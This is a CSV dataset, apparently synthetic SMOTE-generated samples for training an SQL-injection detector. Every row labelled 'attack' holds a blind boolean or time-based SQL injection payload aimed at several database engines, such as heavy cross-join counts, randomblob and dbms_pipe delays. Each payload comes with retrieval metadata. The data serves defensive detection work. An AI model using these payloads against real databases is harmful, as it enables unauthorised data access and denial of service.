id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000135,attack,boolean,"1'||  (  select 'lije' from dual where 5309  =  5309 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",nearest_attack_euclidean,R000161,0.2826212581491436
SMOTE_000136,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R000219,0.38340015616995116
SMOTE_000137,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""mubt""  =  ""mubt",nearest_attack_euclidean,R000202,0.39264435868207626
SMOTE_000138,attack,boolean,"1  )   as otsb where 8380  =  8380 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000471,0.4091694452830698
SMOTE_000139,attack,boolean,"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000168,0.13338752351482458
SMOTE_000140,attack,boolean,"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000618,0.1322402963680489
SMOTE_000141,attack,boolean,"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000574,0.6368414383352169
SMOTE_000142,attack,boolean,"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",nearest_attack_euclidean,R000364,0.7039731076113676
SMOTE_000143,attack,boolean,"1'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000100,0.6233658095044108
SMOTE_000144,attack,boolean,"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""ampn"" like ""ampn",nearest_attack_euclidean,R000120,0.00013234264790997562
SMOTE_000145,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'trzi'  =  'trzi,nearest_attack_euclidean,R000591,0.017800450640756634
SMOTE_000146,attack,boolean,"1  )   as ekgx where 9923  =  9923 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000737,0.040149903838563636
SMOTE_000147,attack,boolean,"1 where 3737  =  3737 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000734,0.01465985534691905
SMOTE_000148,attack,boolean,"-3828%""   )    )     )   or make_set  (  1765  =  8657,8657  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000091,1.2247967666989392
SMOTE_000149,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000162,0.6680355243839932
SMOTE_000150,attack,boolean,-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,nearest_attack_euclidean,R000452,0.07487837734316108
SMOTE_000151,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000173,0.08812455766834959
SMOTE_000152,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'vjdk' like 'vjdk",nearest_attack_euclidean,R000545,0.1105926377232454
SMOTE_000153,attack,boolean,"1  )   as idvt where 3490  =  3490 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000525,0.49410337503239893
SMOTE_000154,attack,boolean,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,nearest_attack_euclidean,R000512,0.8018578366427678
SMOTE_000155,attack,boolean,"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000642,0.2503214966181216
SMOTE_000156,attack,boolean,"1'+  (  select acax where 4169  =  4169 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",nearest_attack_euclidean,R000529,0.6062386652497307
SMOTE_000157,attack,boolean,"1%'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000107,0.27615796475018684
SMOTE_000158,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R000339,0.8837610285608057
SMOTE_000159,attack,boolean,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,nearest_attack_euclidean,R000512,0.48598150100018656
SMOTE_000160,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000443,0.04760926068680862
SMOTE_000161,attack,boolean,"1%""  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000311,0.49829117905280607
SMOTE_000162,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000776,0.07275248690943889
SMOTE_000163,attack,boolean,"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000618,0.10772047726407684
SMOTE_000164,attack,boolean,"1  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000494,0.359762372309807
SMOTE_000165,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",nearest_attack_euclidean,R000501,0.2564646837397748
SMOTE_000166,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""seci""  =  ""seci",nearest_attack_euclidean,R000465,0.8617300449108563
SMOTE_000167,attack,boolean,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,nearest_attack_euclidean,R000257,0.5301411570494599
SMOTE_000168,attack,boolean,"1"" where 1809  =  1809 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000755,0.10426614635804153
SMOTE_000169,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000059,0.2084699123526363
SMOTE_000170,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000750,0.7336713902619252
SMOTE_000171,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542,nearest_attack_euclidean,R000078,0.16285228806544935
SMOTE_000172,attack,boolean,"1%' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000686,0.6543570205238938
SMOTE_000173,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd",nearest_attack_euclidean,R000537,0.7859610905178862
SMOTE_000174,attack,boolean,"-4849""   )    )    or   (  5005  =  9111  )  *9111 and    (    (   ""catv"" like ""catv",nearest_attack_euclidean,R000630,0.007991220278036474
SMOTE_000175,attack,boolean,"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv",nearest_attack_euclidean,R000431,0.883490590469286
SMOTE_000176,attack,boolean,"1%""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000229,0.3882045999144028
SMOTE_000177,attack,boolean,"1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --",nearest_attack_euclidean,R000401,0.11650037367978422
SMOTE_000178,attack,boolean,"1'  )   as ywtu where 3009  =  3009 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000055,0.13149791624498758
SMOTE_000179,attack,boolean,"1   )    )    as krzi where 8727  =  8727 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000599,0.40504733267516047
SMOTE_000180,attack,boolean,"1   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6265  =  6265",nearest_attack_euclidean,R000731,0.05094991885614206
SMOTE_000181,attack,boolean,"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""jtgs"" like ""jtgs",nearest_attack_euclidean,R000313,0.08903410435801554
SMOTE_000182,attack,boolean,"-9978"" or make_set  (  4893  =  9765,9765  )   and ""mhjt""  =  ""mhjt",nearest_attack_euclidean,R000140,1.1988721419999437
SMOTE_000183,attack,boolean,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey",nearest_attack_euclidean,R000735,0.12855870210279607
SMOTE_000184,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000296,0.8101481565543746
SMOTE_000185,attack,boolean,"1  )   as rtpl where 1262  =  1262 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000185,0.5059262521295138
SMOTE_000186,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'hxcq'  =  'hxcq",nearest_attack_euclidean,R000554,0.16557781866223045
SMOTE_000187,attack,boolean,"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000112,0.7792808726646868
SMOTE_000188,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'wvzw'  =  'wvzw",nearest_attack_euclidean,R000141,0.017400263354299794
SMOTE_000189,attack,boolean,"1%""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000553,0.769504070796119
SMOTE_000190,attack,boolean,"1 where 4319  =  4319 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000423,0.1873454128686801
SMOTE_000191,attack,boolean,"1%""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000246,0.3308227982067313
SMOTE_000192,attack,boolean,1'||  (  select 'mlwj' from dual where 4247  =  4247 and 1702  =  8469  )  ||',nearest_attack_euclidean,R000225,0.03388194512740217
SMOTE_000193,attack,boolean,"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000263,0.5800682722332305
SMOTE_000194,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",nearest_attack_euclidean,R000722,0.2859392212734606
SMOTE_000195,attack,boolean,"-4745"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""nifq"" like ""nifq",nearest_attack_euclidean,R000610,2.0618305562476587
SMOTE_000196,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000557,0.47784240814951146
SMOTE_000197,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt",nearest_attack_euclidean,R000532,0.11822576865071473
SMOTE_000198,attack,boolean,"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  4976  =  4976",nearest_attack_euclidean,R000132,0.9637798817811134
SMOTE_000199,attack,boolean,"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000622,0.11409457770393673
SMOTE_000200,attack,boolean,1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,nearest_attack_euclidean,R000613,0.4927502423612906
SMOTE_000201,attack,boolean,"1""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000601,0.08484611815857557
SMOTE_000202,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  '%'  =  '",nearest_attack_euclidean,R000027,0.5740788391006988
SMOTE_000203,attack,boolean,-2361'   )    )    as mzhv where 2905  =  2905 or 9026  =  5388--,nearest_attack_euclidean,R000439,0.008332430663387307
SMOTE_000204,attack,boolean,"1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000126,0.07963327517217607
SMOTE_000205,attack,boolean,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000013,0.26343247274080456
SMOTE_000206,attack,boolean,"1' where 9994  =  9994 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000432,0.3920616433060867
SMOTE_000207,attack,boolean,"1  )   where 3738  =  3738 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000720,0.31607642798203506
SMOTE_000208,attack,boolean,"1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --",nearest_attack_euclidean,R000401,0.2700922460261388
SMOTE_000209,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",nearest_attack_euclidean,R000772,1.1212360864916335
SMOTE_000210,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000081,0.7219227904702002
SMOTE_000211,attack,boolean,"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'fvov'  =  'fvov",nearest_attack_euclidean,R000108,1.7028195046594314
SMOTE_000212,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   7700  =  7700",nearest_attack_euclidean,R000634,0.3410820962877739
SMOTE_000213,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R000761,2.0653422514611255
SMOTE_000214,attack,boolean,1   )    )     )   and 8990  =  4775 and    (    (     (  1894  =  1894,nearest_attack_euclidean,R000473,0.1913814970538228
SMOTE_000215,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R000405,0.9568971682363174
SMOTE_000216,attack,boolean,"1   )    )     )   and elt  (  3132  =  1541,1541  )   and    (    (     (  4258  =  4258",nearest_attack_euclidean,R000385,0.15070512129556318
SMOTE_000217,attack,boolean,"-2178'   )    )     )   or elt  (  3421  =  2899,2899  )   and    (    (     (  'jdst'  =  'jdst",nearest_attack_euclidean,R000384,0.7393779411070734
SMOTE_000218,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000475,0.5483377762471374
SMOTE_000219,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'ybjo'  =  'ybjo",nearest_attack_euclidean,R000350,0.1203908197463984
SMOTE_000220,attack,boolean,"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # zwck",nearest_attack_euclidean,R000692,2.198097837387125
SMOTE_000221,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000676,0.3044863765120433
SMOTE_000222,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000325,0.12893753068411526
SMOTE_000223,attack,boolean,"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000348,0.6229617641925335
SMOTE_000224,attack,boolean,"1  )   as ihan where 5298  =  5298 and elt  (  6587  =  3479,3479  )  --",nearest_attack_euclidean,R000375,0.043636400232441405
SMOTE_000225,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000059,0.7805831496945285
SMOTE_000226,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'aatp'  =  'aatp",nearest_attack_euclidean,R000652,0.5477014368974558
SMOTE_000227,attack,boolean,"1%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000543,0.15904645202412365
SMOTE_000228,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   '%'  =  '",nearest_attack_euclidean,R000127,0.4180274225833862
SMOTE_000229,attack,boolean,"1""   )    )    and elt  (  3785  =  9386,9386  )   and    (    (   ""inwa"" like ""inwa",nearest_attack_euclidean,R000582,0.92276974529505
SMOTE_000230,attack,boolean,-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,nearest_attack_euclidean,R000452,0.10381438961351112
SMOTE_000231,attack,boolean,"1   )    )    as tbiq where 7159  =  7159 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000322,0.15551377480219652
SMOTE_000232,attack,boolean,1'   )    )    as oyad where 7161  =  7161 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000458,0.1901226414276312
SMOTE_000233,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000750,0.32140651897500166
SMOTE_000234,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R000370,0.5867503138444703
SMOTE_000235,attack,boolean,"-8893%'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000050,1.0148467725377992
SMOTE_000236,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000319,0.2675901113084932
SMOTE_000237,attack,boolean,"1%""   )    )     )   and   (  3502  =  7893  )  *7893 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000487,0.22202184614944923
SMOTE_000238,attack,boolean,"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000244,0.6083209767722525
SMOTE_000239,attack,boolean,"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""cgps"" like ""cgps",nearest_attack_euclidean,R000639,0.5509076907716224
SMOTE_000240,attack,boolean,"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000502,1.5175001373669756
SMOTE_000241,attack,boolean,"1"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000425,0.5060587861104279
SMOTE_000242,attack,boolean,"1'+  (  select thmg where 2546  =  2546 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000709,0.20120414417524443
SMOTE_000243,attack,boolean,"1%""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000644,0.059317872942243235
SMOTE_000244,attack,boolean,"1' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000687,0.0007573236807997858
SMOTE_000245,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""seci""  =  ""seci",nearest_attack_euclidean,R000465,0.038925291075098435
SMOTE_000246,attack,boolean,"1%""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000115,0.13117070277957957
SMOTE_000247,attack,boolean,"1   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000611,0.07844064238773073
SMOTE_000248,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000139,1.1100630924163837
SMOTE_000249,attack,boolean,"1%"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000295,0.6222357699062827
SMOTE_000250,attack,boolean,"1  )   where 7978  =  7978 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000656,0.6294534077953127
SMOTE_000251,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'ctbs' like 'ctbs",nearest_attack_euclidean,R000171,0.2168116510150129
SMOTE_000252,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000174,0.3712346476160931
SMOTE_000253,attack,boolean,"1  )   where 5465  =  5465 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000240,0.1088502065858313
SMOTE_000254,attack,boolean," select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000016,2.502351495159713
SMOTE_000255,attack,boolean,"1%' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000496,0.06360462209334691
SMOTE_000256,attack,boolean,"-9166""  )   as hlre where 4768  =  4768 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",nearest_attack_euclidean,R000577,0.32962332614780826
SMOTE_000257,attack,boolean,"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000333,0.6807030786098128
SMOTE_000258,attack,boolean,"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm",nearest_attack_euclidean,R000123,0.8248754709383433
SMOTE_000259,attack,boolean,1'   )    )    and 7533  =  7533 and    (    (   'gvoh'  =  'gvoh,nearest_attack_euclidean,R000563,0.19968233241931677
SMOTE_000260,attack,boolean,1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,nearest_attack_euclidean,R000613,0.054766070032869776
SMOTE_000261,attack,boolean,"1""   )    )     )   rlike   (  select   (  case when   (  6915  =  4531  )   then 1 else 0x28 end   )    )    and    (    (     (  ""jzzu""  =  ""jzzu",nearest_attack_euclidean,R000421,0.5416657657203026
SMOTE_000262,attack,boolean,"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000618,0.0016085273885577413
SMOTE_000263,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000208,0.35383220629378903
SMOTE_000264,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R000204,0.27194893852931756
SMOTE_000265,attack,boolean,"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""alvd"" like ""alvd",nearest_attack_euclidean,R000575,1.0944698275288478
SMOTE_000266,attack,boolean,"1%"" or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000175,0.024285547367696902
SMOTE_000267,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000081,0.015589144125836594
SMOTE_000268,attack,boolean,"1""  )   as buky where 7898  =  7898 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000061,1.1989810966831118
SMOTE_000269,attack,boolean,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R000273,0.14310976251447605
SMOTE_000270,attack,boolean,"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""cgps"" like ""cgps",nearest_attack_euclidean,R000639,1.1457577976918
